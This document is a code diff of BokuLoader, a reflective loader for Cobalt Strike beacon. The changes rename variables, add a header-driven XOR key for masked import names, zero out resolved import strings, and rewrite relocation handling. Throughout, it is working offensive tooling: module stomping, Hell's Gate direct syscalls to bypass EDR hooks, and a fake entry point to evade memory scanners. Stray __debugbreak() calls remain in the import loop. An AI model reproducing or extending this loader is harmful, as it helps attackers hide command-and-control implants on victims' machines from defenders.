@@ -1,98 +1,102 @@
 #include "BokuLoader.h"
 
-__declspec(dllexport) void* WINAPI BokuLoader()
+void * BokuLoader()
 {
-    APIS api;
+    APIS   api;
     SIZE_T size;
     void * base;
-    Dll rdll_dst, rdll_src;
+    Dll virtual_beacon_dll, raw_beacon_dll;
+
+    unsigned char xorkey    = 0;
     unsigned int oldprotect = 0;
     unsigned int newprotect = 0;
-    void* hMapFile = NULL;
-    RtlSecureZeroMemory(&rdll_dst,sizeof(rdll_dst));
-    RtlSecureZeroMemory(&rdll_src,sizeof(rdll_src));
+    void* hMapFile          = NULL;
+    RtlSecureZeroMemory(&virtual_beacon_dll,sizeof(Dll));
+    RtlSecureZeroMemory(&raw_beacon_dll,sizeof(Dll));
 
     // Get Raw beacons base address
-    rdll_src.dllBase = returnRDI();
-    parseDLL(&rdll_src);
+    raw_beacon_dll.dllBase = returnRDI();
+    parseDLL(&raw_beacon_dll);
 
     getApis(&api);
 
-    checkUseRWX(&rdll_src);
+    checkUseRWX(&raw_beacon_dll);
 
-    rdll_dst.dllBase = NULL;
+    virtual_beacon_dll.dllBase = NULL;
     // Check if DLL Module stomping option is enabled from the C2 profile via allocator code 0x4 written by UDRL Aggressor script
-    if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x4){
+    if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x4){
         // LoadLibraryExA(
         //    DLL to stomp UTF8 string,
         //    hFile = 0 ;This parameter is reserved for future use. It must be NULL.
         //    DONT_RESOLVE_DLL_REFERENCES  (0x00000001) ; the system does not call DllMain
-        base = api.LoadLibraryExA(((char*)rdll_src.dllBase+0x44),0,1);
+        base = api.LoadLibraryExA(((char*)raw_beacon_dll.dllBase+0x44),0,1);
         // write our .text section at DLL+0x4000 (first 0x1000 is the uncopied header)
         base = ((char*)base + 0x3000);
         oldprotect = 0;
         if(base){
             // Add some extra size 
-            size = rdll_src.size + 0x2000;
+            size = raw_beacon_dll.size + 0x2000;
             oldprotect = 0;
             // NtProtectVirtualMemory syscall
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
             // Have to zero out the memory for the DLL memory to become a private copy, else unwritten memory in beacon DLL can cause a crash.
             RtlSecureZeroMemory(base,size);
-            rdll_dst.dllBase = base;
+            virtual_beacon_dll.dllBase = base;
         }
     }
-    else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x3){
-        size = ((char*)rdll_src.size + 0x10000);
+    else if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x3){
+        size = ((char*)raw_beacon_dll.size + 0x10000);
         unsigned __int64 align = 0xFFFFFFFFFFFFF000;
         base = api.HeapAlloc(api.GetProcessHeap(),0x8,size); // 0x8 = zero out heap memory
         base = (void*)((char*)base + 0x2000);
         base = (void*)((unsigned __int64)base & align);
         if(base){
             oldprotect = 0;
-            rdll_dst.dllBase = base;
+            virtual_beacon_dll.dllBase = base;
             HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
+            ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
         }
     }
-    else if ((*(USHORT *)((char*)rdll_src.dllBase + 0x40)) == 0x2){
-        size = rdll_src.size;
+    else if ((*(USHORT *)((char*)raw_beacon_dll.dllBase + 0x40)) == 0x2){
+        size = raw_beacon_dll.size;
         hMapFile = api.CreateFileMappingA(NtCurrentProcess(),0,PAGE_EXECUTE_READWRITE,0,size,0);
         if(hMapFile){
             base = api.MapViewOfFile(hMapFile,0xF003F,0,0,0);
             if(base){
                 oldprotect = 0;
-                rdll_dst.dllBase = base;
+                virtual_beacon_dll.dllBase = base;
                 HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
-                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, rdll_src.BeaconMemoryProtection, &oldprotect);
+                ((tNtProt)HellDescent)(NtCurrentProcess(), &base, &size, raw_beacon_dll.BeaconMemoryProtection, &oldprotect);
             }
         }
     }
     else{
         // Allocate new memory to write our new RDLL too
         base = NULL;
-        size = rdll_src.size;
+        size = raw_beacon_dll.size;
         HellsGate(getSyscallNumber(api.pNtAllocateVirtualMemory));
-        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, rdll_src.BeaconMemoryProtection);
+        ((tNtAlloc)HellDescent)(NtCurrentProcess(), &base, 0, &size, MEM_RESERVE|MEM_COMMIT, raw_beacon_dll.BeaconMemoryProtection);
         RtlSecureZeroMemory(base,size); // Zero out the newly allocated memory
 
-        rdll_dst.dllBase = base;
+        virtual_beacon_dll.dllBase = base;
     }
  
-    doSections(&rdll_dst, rdll_src);
-    doImportTable(&api, &rdll_dst, rdll_src);
-    doRelocations(&api, &rdll_dst, rdll_src);
+    checkObfuscate(&raw_beacon_dll); 
+
+    doSections(&virtual_beacon_dll, &raw_beacon_dll);
+    doImportTable(&api, &virtual_beacon_dll, &raw_beacon_dll);
+    doRelocations(&api, &virtual_beacon_dll, &raw_beacon_dll);
    
     // Get the entry point for beacon located in the .text section
-    //rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
-    rdll_dst.EntryPoint = checkFakeEntryAddress_returnReal(&rdll_src, &rdll_dst);
+    //virtual_beacon_dll.EntryPoint = getBeaconEntryPoint(virtual_beacon_dll.dllBase, raw_beacon_dll.OptionalHeader);
+    virtual_beacon_dll.EntryPoint = checkFakeEntryAddress_returnReal(&raw_beacon_dll, &virtual_beacon_dll);
 
     // If beacon.text is not RWX, change memory protections of virtual beacon.text section to RX
-    if(rdll_src.BeaconMemoryProtection == PAGE_READWRITE){
+    if(raw_beacon_dll.BeaconMemoryProtection == PAGE_READWRITE){
         oldprotect = 0;
-        base = rdll_dst.TextSection;
-        size = rdll_dst.TextSectionSize;
+        base = virtual_beacon_dll.TextSection;
+        size = virtual_beacon_dll.TextSectionSize;
         newprotect = PAGE_EXECUTE_READ;
         // NtProtectVirtualMemory syscall
         HellsGate(getSyscallNumber(api.pNtProtectVirtualMemory));
@@ -104,8 +108,22 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // DLLs can use this opportunity to initialize any instance data or to use the TlsAlloc function to allocate a thread local storage (TLS) index.
     // https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain
     // Calling the entrypoint of beacon with DLL_PROCESS_ATTACH is required for beacon not to crash. This initializes beacon. After init then beacon will return to us.
-    ((DLLMAIN)rdll_dst.EntryPoint)(rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
-    return rdll_dst.EntryPoint;
+    ((DLLMAIN)virtual_beacon_dll.EntryPoint)(virtual_beacon_dll.dllBase, DLL_PROCESS_ATTACH, NULL);
+    return virtual_beacon_dll.EntryPoint;
+}
+
+void checkObfuscate(Dll * raw_beacon_dll_struct){
+    PIMAGE_DOS_HEADER  raw_beacon_dll_DOS_HEADER   = (PIMAGE_DOS_HEADER)raw_beacon_dll_struct->dllBase;
+    PIMAGE_FILE_HEADER raw_beacon_dll_FILE_HEADER  = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_struct->dllBase);
+
+    // xor key at beacon.dll+0x24 (OEM Identifier)
+    unsigned char obfuscate_flag = (unsigned char)raw_beacon_dll_DOS_HEADER->e_oemid;
+    
+    if (obfuscate_flag == 0x1){
+        raw_beacon_dll_struct->xor_key = *(unsigned char*)((char*)&raw_beacon_dll_DOS_HEADER->e_oemid + 0x1);
+    }else{
+        raw_beacon_dll_struct->xor_key = 0;
+    }
 }
 
 // OptionalHeader + 0x34 = OptionalHeader.Win32VersionValue. Seems unused by CS so we will put the useRWX flag there
@@ -132,14 +150,14 @@ void* checkFakeEntryAddress_returnReal(Dll * raw_beacon_dll_struct, Dll * virtua
     }
 }
 
-void doSections(Dll * rdll_dst, Dll * rdll_src){
+void doSections(Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
     // Save .text section address and size for destination RDLL so we can make it RE later
     int textSectionFlag = FALSE;
     int ObfuscateFlag   = FALSE;
-    rdll_dst->TextSection = NULL;
-    rdll_dst->TextSectionSize = 0;
-    unsigned long numberOfSections = rdll_src->NumberOfSections;
-    rdll_src->NthSection      = add(rdll_src->OptionalHeader, rdll_src->SizeOfOptionalHeader);
+    virtual_beacon_dll->TextSection = NULL;
+    virtual_beacon_dll->TextSectionSize = 0;
+    unsigned long numberOfSections = raw_beacon_dll->NumberOfSections;
+    raw_beacon_dll->NthSection     = add(raw_beacon_dll->OptionalHeader, raw_beacon_dll->SizeOfOptionalHeader);
     Section section;
     while( numberOfSections-- )
     {
@@ -149,76 +167,69 @@ void doSections(Dll * rdll_dst, Dll * rdll_src){
             "mov ecx, [rax] \n"
             "xchg rax, rcx \n"
             : "=r" (section.RVA)        // RAX OUT
-            : "r" (rdll_src->NthSection) // RAX IN
+            : "r" (raw_beacon_dll->NthSection) // RAX IN
         );
-        section.dst_rdll_VA = add(rdll_dst->dllBase, section.RVA);
+        section.dst_rdll_VA = add(virtual_beacon_dll->dllBase, section.RVA);
         __asm__(
             "add rax, 0x14 \n"  // offsetof(IMAGE_SECTION_HEADER, PointerToRawData)
             "xor rcx, rcx \n"
             "mov ecx, [rax] \n"
             "xchg rax, rcx \n"
             : "=r" (section.PointerToRawData) // RAX OUT
-            : "r" (rdll_src->NthSection)       // RAX IN
+            : "r" (raw_beacon_dll->NthSection)       // RAX IN
         );
-        section.src_rdll_VA = add(rdll_src->dllBase, section.PointerToRawData);
+        section.src_rdll_VA = add(raw_beacon_dll->dllBase, section.PointerToRawData);
         __asm__(
             "add rax, 0x10 \n"  // offsetof(IMAGE_SECTION_HEADER, SizeOfRawData)
             "xor rcx, rcx \n"
             "mov ecx, [rax] \n"
             "xchg rax, rcx \n"
             : "=r" (section.SizeOfSection) // RAX OUT
-            : "r" (rdll_src->NthSection)    // RAX IN
+            : "r" (raw_beacon_dll->NthSection)    // RAX IN
         );
         // check if this is the .text section
         if (textSectionFlag == FALSE)
         {
-            __asm__(
-                "mov rcx, [rax] \n"        // name of the section
-                "mov r8, 0xB7BBA6B7ED \n" // 0xB7BBA6B7ED == '.text' XOR 0xC3
-                "cmp rcx, r8 \n"
-                "jne notObfuscated \n"
-                "mov rax, 0xC3  \n"        // ObfuscateFlag == TRUE
-                "jmp exitTextTest \n"
-              "notObfuscated: \n"
-                "mov rax, 0x0  \n"        // ObfuscateFlag == FALSE
-              "exitTextTest: \n"
-                : "=r" (ObfuscateFlag)        // RAX OUT
-                : "r" (rdll_src->NthSection)  // RAX IN
-            );
             // Save the .text section address & size for later so we can change it from RW to RE. This has to be done after we do relocations
-            rdll_dst->TextSection     = section.dst_rdll_VA;
-            rdll_dst->TextSectionSize = section.SizeOfSection;
-            if(ObfuscateFlag == 0xC3)
-            {
-                rdll_dst->obfuscate = 0xC3C3C3C3C3C3C3C3;
-            }
+            virtual_beacon_dll->TextSection     = section.dst_rdll_VA;
+            virtual_beacon_dll->TextSectionSize = section.SizeOfSection;
             textSectionFlag = TRUE;
         }
         // Copy the section from the source address to the destination for the size of the section
         Memcpy(section.dst_rdll_VA, section.src_rdll_VA, section.SizeOfSection);
         // Get the address of the next section header and loop until there are no more sections
-        rdll_src->NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
+        raw_beacon_dll->NthSection += 0x28; // sizeof( IMAGE_SECTION_HEADER ) = 0x28
     }
 }
 
-void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
-    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
+void doImportTable(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
+    void *ImportDirectory, *importEntryHint, *BaseOrdinal, *TableIndex, *nImportDesc;
+    void *EntryAddress, *importNameRVA, *LookupTableEntry, *AddressTableEntry, *EntryName, *nullCheck;
     unsigned __int64 len_importName, len_EntryName;
-    // Get the address of our RDLL's Import Directory entry in within the Data Directory of the Optional Header
-    void* DataDirectory = rdll_src->OptionalHeader + 0x78;
-    // Get the Address of the Import Directory from the Data Directory
-    char * importName;
-    __asm__(
-        "xor rcx, rcx \n"
-        "mov ecx, [rax] \n" // RVA of Import Directory
-        "add rdx, rcx \n"   // Import Directory of beacon = RVA of Import Directory + New RDLL Base Address
-        "xchg rax, rdx \n"
-        : "=r" (ImportDirectory) // RAX OUT
-        : "r" (DataDirectory),   // RAX IN
-          "r" (rdll_dst->dllBase) // RDX IN
-    );
-    void* nImportDesc = ImportDirectory;
+    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_dll_data_directory  = NULL;
+    char * importName = NULL;
+    DWORD    ImportDirectory_RVA       = 0;
+    DWORD    ImportDirectory_Size      = 0;
     Dll dll_import;
+    RtlSecureZeroMemory(&dll_import,sizeof(Dll));
+     
+    // Get the Image base by walking the headers
+    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
+    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
+    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+
+    // Get the raw file offset to the Data Directory located in the Optional Header
+    raw_beacon_dll_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_dll_OPTIONAL_HEADER->DataDirectory;
+
+    ImportDirectory_RVA   = raw_beacon_dll_data_directory[1].VirtualAddress;
+    ImportDirectory_Size  = raw_beacon_dll_data_directory[1].Size;
+    ImportDirectory       = ((char*)virtual_beacon_dll->dllBase + ImportDirectory_RVA);
+
+    nImportDesc = ImportDirectory;
+    
     __asm__(
         "xor rcx, rcx \n"
         "add rdx, 0xC \n"   // 12 (0xC) byte offset is the address of the Name RVA within the image import descriptor for the DLL we are importing
@@ -227,20 +238,21 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
         "add rax, rdx \n"        // Address of Module String = dllBase + ((PIMAGE_IMPORT_DESCRIPTOR)nextModuleImportDescriptor)->Name
         : "=r" (importNameRVA),   // RDX OUT
           "=r" (importName)       // RAX OUT
-        : "r" (rdll_dst->dllBase), // RAX IN
+        : "r" (virtual_beacon_dll->dllBase), // RAX IN
           "r" (nImportDesc)       // RDX IN
     );
     // The last entry in the image import directory is all zeros
     while(importNameRVA)
     {
-        if(rdll_dst->obfuscate){
-            len_importName = (unsigned __int64)StringLengthA(importName);
-            xorc(len_importName, importName, XORKEY);
-            dll_import.dllBase = xLoadLibrary(importName); 
-            xorc(len_importName, importName, XORKEY); // remask the import DLL name
+        len_importName       = (unsigned __int64)StringLengthA(importName);
+        if(raw_beacon_dll->xor_key){
+            xorc(len_importName, importName, raw_beacon_dll->xor_key);
+            dll_import.dllBase   = xLoadLibrary(importName); 
         }else{
-            dll_import.dllBase = xLoadLibrary(importName); 
+            dll_import.dllBase   = xLoadLibrary(importName); 
         }
+        __debugbreak();
+        stomp(len_importName, importName); // 0 out import DLL name in virtual beacon dll
         __asm__(
             "xor rcx, rcx \n"   // importLookupTableEntry = VA of the OriginalFirstThunk
             "mov ecx, [rax] \n" // Move the 4 byte unsigned long of IMAGE_IMPORT_DESCRIPTOR->OriginalFirstThunk into Ecx
@@ -248,7 +260,7 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
             "xchg rax, rcx \n"
             : "=r" (LookupTableEntry) // RAX OUT
             : "r" (nImportDesc),      // RAX IN        
-              "r" (rdll_dst->dllBase)  // RDX IN
+              "r" (virtual_beacon_dll->dllBase)  // RDX IN
         );
         __asm__(
             "xor rcx, rcx \n"   // importAddressTableEntry = VA of the IAT (via first thunk not origionalfirstthunk)
@@ -258,7 +270,7 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
             "xchg rax, rcx \n"
             : "=r" (AddressTableEntry) // RAX OUT
             : "r" (nImportDesc),       // RAX IN
-              "r" (rdll_dst->dllBase)   // RDX IN
+              "r" (virtual_beacon_dll->dllBase)   // RDX IN
         );
         __asm__(
             "mov rax, [rax] \n"
@@ -292,17 +304,15 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
                       "r" (BaseOrdinal)      // RDX IN
                 );
                 __asm__( // The ExportAddressTable/AddressOfFunctions holds unsigned long (4 byte) RVA's for the executable functions/api's address
-                    "push rbx \n"
                     "mov r11, rdx \n"
-                    "xor rbx, rbx \n"
-                    "add bl, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
-                    "mul rbx \n"        // importEntryExportTableIndex * sizeof(unsigned long)
+                    "xor r9, r9 \n"
+                    "add r9b, 0x4 \n"    // sizeof(unsigned long) - This is because each entry in the table is a 4 byte unsigned long which is the RVA/offset for the actual executable functions address
+                    "mul r9 \n"        // importEntryExportTableIndex * sizeof(unsigned long)
                     "add rax, r11 \n"   // RVA for our functions address
-                    "xor rbx, rbx \n"
-                    "mov ebx, [rax] \n" // The RVA for the executable function we are importing
-                    "add rcx, rbx \n"   // The executable address within the imported DLL for the function we imported
+                    "xor r10, r10 \n"
+                    "mov r10d, [rax] \n" // The RVA for the executable function we are importing
+                    "add rcx, r10 \n"   // The executable address within the imported DLL for the function we imported
                     "xchg rax, rcx \n"
-                    "pop rbx \n"
                     : "=r" (EntryAddress)                  // RAX OUT
                     : "r"(TableIndex),                     // RAX IN - importEntryExportTableIndex
                       "r"(dll_import.Export.AddressTable), // RDX IN - AddressTable
@@ -324,17 +334,18 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
                     "add rax, 0x2 \n"   // The hint is the first 2 bytes, then its followed by the name string for our import. We need to drop the first 2 bytes so we just have the name string
                     : "=r" (EntryName)         // RAX OUT
                     : "r" (AddressTableEntry), // RAX IN, import table entry we are going to overwrite / The RVA for our functions Name/Hint Table entry
-                      "r" (rdll_dst->dllBase)   // RDX IN
+                      "r" (virtual_beacon_dll->dllBase)   // RDX IN
                 );
                 // patch in the address for this imported function
-                if(rdll_dst->obfuscate){
-                    len_EntryName = (unsigned __int64)StringLengthA(EntryName);
-                    xorc(len_EntryName, EntryName, XORKEY);
+                len_EntryName = (unsigned __int64)StringLengthA(EntryName);
+                if(raw_beacon_dll->xor_key){
+                    xorc(len_EntryName, EntryName, raw_beacon_dll->xor_key);
                     EntryAddress = xGetProcAddress(EntryName, &dll_import);
-                    xorc(len_EntryName, EntryName, XORKEY); // remask the import entry name
                 }else{
                     EntryAddress = xGetProcAddress(EntryName, &dll_import);
                 }
+                __debugbreak();
+                stomp(len_EntryName, EntryName); // 0 out import entry name in virtual beacon dll
                 __asm__(
                     "mov [rax], rdx \n" // write the address of the imported api to our import table
                     : // no outputs
@@ -361,99 +372,88 @@ void doImportTable(APIS * api, Dll * rdll_dst, Dll * rdll_src){
             : "=r" (importName),     // RDX OUT
               "=r" (importNameRVA)   // RAX OUT
             : "r" (nImportDesc),     // RAX IN
-              "r" (rdll_dst->dllBase) // RDX IN
+              "r" (virtual_beacon_dll->dllBase) // RDX IN
         );
     }
 }
-void doRelocations(APIS * api, Dll * rdll_dst, Dll * rdll_src){
-    void* nextRelocBlock, *RelocDirSize, *BaseAddressDelta, *relocBlockSize, *relocVA, *RelocBlockEntries, *nextRelocBlockEntry;
-    __asm__(
-        "add rdx, 0x18 \n"  // OptionalHeader.ImageBase
-        "mov rdx, [rdx] \n"
-        "sub rax, rdx \n"   // dllBase.ImageBase
-        : "=r" (BaseAddressDelta)       // RAX OUT
-        : "r" (rdll_dst->dllBase),       // RAX IN
-          "r" (rdll_src->OptionalHeader) // RDX IN
-    );
-    void* RelocDir = rdll_src->OptionalHeader + 0x98; // OptionalHeader+0x98 = &DataDirectory[Base Relocation Table]
-    __asm__(
-        "xor rcx, rcx \n"
-        "mov ecx, [rdx] \n" // 4 byte unsigned long Virtual Address of the Relocation Directory table
-        "add rax, rcx \n"   // newRelocationTableAddr = dllBase + RVAnewRelocationTable
-        : "=r" (nextRelocBlock)   // RAX OUT
-        : "r" (rdll_dst->dllBase), // RAX IN
-          "r" (RelocDir)          // RDX IN
-    );
-    __asm__(
-        "xor rcx, rcx \n"
-        "mov ecx, [rax+0x4] \n" // 4 byte unsigned long Size of the Relocation Directory table
-        "xchg rax, rcx \n"
-        : "=r" (RelocDirSize) // RAX OUT
-        : "r" (RelocDir)      // RAX IN
-    );
+void doRelocations(APIS * api, Dll * virtual_beacon_dll, Dll * raw_beacon_dll){
+    unsigned __int64 beacon_image_base    = 0;
+    unsigned __int64 BaseAddressDelta     = 0;
+    PIMAGE_DOS_HEADER        raw_beacon_dll_DOS_HEADER      = NULL;
+    PIMAGE_FILE_HEADER       raw_beacon_dll_FILE_HEADER     = NULL;
+    PIMAGE_OPTIONAL_HEADER64 raw_beacon_dll_OPTIONAL_HEADER = NULL;
+    PIMAGE_DATA_DIRECTORY    raw_beacon_dll_data_directory  = NULL;
+    DWORD    BaseRelocationTable_RVA       = 0;
+    DWORD    BaseRelocationTable_Size      = 0;
+    void*    BaseRelocationTable           = 0;
+    PIMAGE_BASE_RELOCATION this_RelocBlock = NULL;
+    PIMAGE_BASE_RELOCATION this_BaseRelocation = NULL;
+    DWORD this_BaseRelocation_VA = 0;
+    DWORD this_BaseRelocation_SizeOfBlock = 0;
+    DWORD this_relocation_RVA = 0;
+    unsigned short* this_relocation = NULL;
+    void* this_relocation_VA = NULL;
+    DWORD this_relocBlock_EntriesCount = 0;
+     
+     
+    // Get the Image base by walking the headers
+    raw_beacon_dll_DOS_HEADER       = (PIMAGE_DOS_HEADER)raw_beacon_dll->dllBase;
+    raw_beacon_dll_FILE_HEADER      = (PIMAGE_FILE_HEADER)(raw_beacon_dll_DOS_HEADER->e_lfanew + (char*)raw_beacon_dll_DOS_HEADER);
+    raw_beacon_dll_OPTIONAL_HEADER  = (PIMAGE_OPTIONAL_HEADER64)(0x18 + (char*)raw_beacon_dll_FILE_HEADER);
+    beacon_image_base               = (unsigned __int64)raw_beacon_dll_OPTIONAL_HEADER->ImageBase;
+    // Get the Base Address difference
+    BaseAddressDelta                = (unsigned __int64)((char*)virtual_beacon_dll->dllBase - beacon_image_base);
 
-    if(RelocDirSize && BaseAddressDelta) // check if relocations present
-    {
-        __asm__(
-            "xor rcx, rcx \n"
-            "mov ecx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
-            "xchg rax, rcx \n"
-            : "=r" (relocBlockSize) // RAX OUT
-            : "r" (nextRelocBlock)  // RAX IN
-        );
-        while(relocBlockSize)
+    // Get the raw file offset to the Data Directory located in the Optional Header
+    // The Data Directory has the RVAs and sizes of all the other tables & directories
+    raw_beacon_dll_data_directory   = (PIMAGE_DATA_DIRECTORY)raw_beacon_dll_OPTIONAL_HEADER->DataDirectory;
+
+    // Get the RVA and size of the Base Relocation Table from the Data Directory in the raw beacon DLL Optional Header
+    BaseRelocationTable_RVA   = raw_beacon_dll_data_directory[5].VirtualAddress;
+    BaseRelocationTable_Size  = raw_beacon_dll_data_directory[5].Size;
+    
+    // Setup the loop to start at the first Base Relocation block in the Base Relocation table
+    BaseRelocationTable       = (void*)((char*)virtual_beacon_dll->dllBase + BaseRelocationTable_RVA);
+    this_BaseRelocation = (PIMAGE_BASE_RELOCATION)BaseRelocationTable;
+    this_BaseRelocation_VA               = this_BaseRelocation->VirtualAddress;
+    this_BaseRelocation_SizeOfBlock      = this_BaseRelocation->SizeOfBlock;
+
+    // Loop through and resolve all the block relocation entries in all the block relocations
+    // The last block will be all zeros and that's how we know we've reached the end
+    while(this_BaseRelocation->VirtualAddress != 0){
+        this_relocation                  = (unsigned short*)((char*)this_BaseRelocation + sizeof(IMAGE_BASE_RELOCATION));
+        this_relocation_RVA              = this_BaseRelocation->VirtualAddress;
+        this_BaseRelocation_SizeOfBlock  = this_BaseRelocation->SizeOfBlock;
+        this_relocation_VA               = (void*)((char*)virtual_beacon_dll->dllBase + this_relocation_RVA);
+        this_relocBlock_EntriesCount     = (this_BaseRelocation_SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2; 
+    
+        // Check that its the correct type and then write the relocation
+        // Do this for all entries in the Relocation Block
+        while( this_relocBlock_EntriesCount-- )
         {
             __asm__(
-                "xor rcx, rcx \n"
-                "mov ecx, [rdx] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->VirtualAddress
-                "add rax, rcx \n"   // &reflectiveDll.dll + nextRelocationBlockRVA = VA of next Relocation Block
-                : "=r" (relocVA)          // RAX OUT
-                : "r" (rdll_dst->dllBase), // RAX IN
-                  "r" (nextRelocBlock)    // RDX IN
+                "xor r9, r9     \n"
+                "mov r9w, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
+                "mov rax, r9    \n"
+                "shr r9, 0x0C   \n"    // Check the 4 bit type
+                "cmp r9b, 0x0A  \n"   // IMAGE_REL_BASED_DIR64?
+                "jne badtype    \n"
+                "shl rax, 0x34  \n"   // only keep the last 12 bits of RAX by shaking the RAX register
+                "shr rax, 0x34  \n"   // the last 12 bits is the offset, the first 4 bits is the type
+                "add rdx, rax   \n"    // in memory Virtual Address of our current relocation entry
+                "mov r10, [rdx] \n"  // value of the relocation entry
+                "add r10, rcx   \n"    // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
+                "mov [rdx], r10 \n"  // WRITE THAT RELOC!
+                "badtype:\n"
+                : // no outputs
+                : "r" (this_relocation),     // RAX IN
+                  "r" (this_relocation_VA),  // RDX IN
+                  "r" (BaseAddressDelta)     // RCX IN
             );
-            __asm__(
-                "xor rdx, rdx \n"
-                "mov rcx, 0x2 \n" // 0x2 = size of image relocation WORD
-                "sub ax, 0x8 \n"  // Minus the 8 byte IMAGE_BASE_RELOCATION structure which tells us the RVA for the block and the blocksize
-                "div cx \n"       // relocBlockSize/2
-                : "=r" (RelocBlockEntries) // RAX OUT
-                : "r" (relocBlockSize)     // RAX IN
-            );
-            nextRelocBlockEntry = nextRelocBlock + 0x8;
-            while( RelocBlockEntries-- )
-            {
-                __asm__(
-                    "push rbx \n"
-                    "xor rbx, rbx \n"
-                    "mov bx, [rax] \n"  // 2 byte value for the Relocation Entry (with the 4 bit type and 12 bit offset)
-                    "mov rax, rbx \n"
-                    "shr rbx, 0x0C \n"  // Check the 4 bit type
-                    "cmp bl, 0x0A \n"   // IMAGE_REL_BASED_DIR64?
-                    "jne badtype \n"
-                    "shl rax, 0x34 \n"  // only keep the last 12 bits of RAX by shaking the RAX register
-                    "shr rax, 0x34 \n"  // the last 12 bits is the offset, the first 4 bits is the type
-                    "add rdx, rax \n"   // in memory Virtual Address of our current relocation entry
-                    "mov rbx, [rdx] \n" // value of the relocation entry
-                    "add rbx, rcx \n"   // value of our relocation entry + the hardcoded Addr:Our Real in memory VA delta we calculated earlier
-                    "mov [rdx], rbx \n" // WRITE THAT RELOC!
-                    "badtype:\n"
-                    "pop rbx \n"
-                    : // no outputs
-                    : "r" (nextRelocBlockEntry), // RAX IN
-                      "r" (relocVA),             // RDX IN
-                      "r" (BaseAddressDelta)     // RCX IN
-                );
-                nextRelocBlockEntry += 0x2;
-            }
-            nextRelocBlock = add(nextRelocBlock, relocBlockSize);
-            __asm__(
-                "xor rcx, rcx \n"
-                "mov ecx, [rax+0x4] \n" // 4 byte unsigned long of (PIMAGE_BASE_RELOCATION)newRelocationTableAddr)->SizeOfBlock
-                "xchg rax, rcx \n"
-                : "=r" (relocBlockSize) // RAX OUT
-                : "r" (nextRelocBlock)  // RAX IN
-            );
+            this_relocation = (unsigned short*)((char*)this_relocation + 2);
         }
+        // Now move to the next Base Relocation Block and resolve all of the relocation entries
+        this_BaseRelocation = ((char*)this_BaseRelocation + this_BaseRelocation->SizeOfBlock);
     }
 }
 
@@ -649,6 +649,14 @@ void xorc(unsigned __int64 length, unsigned char * buff, unsigned char maskkey) 
   for (i = 0; i < length; ++i)
   {
     buff[i] ^= maskkey;
+  }
+}
+
+void stomp(unsigned __int64 length, unsigned char * buff) {
+  int i;
+  for (i = 0; i < length; ++i)
+  {
+    buff[i] = 0;
   }
 }
 
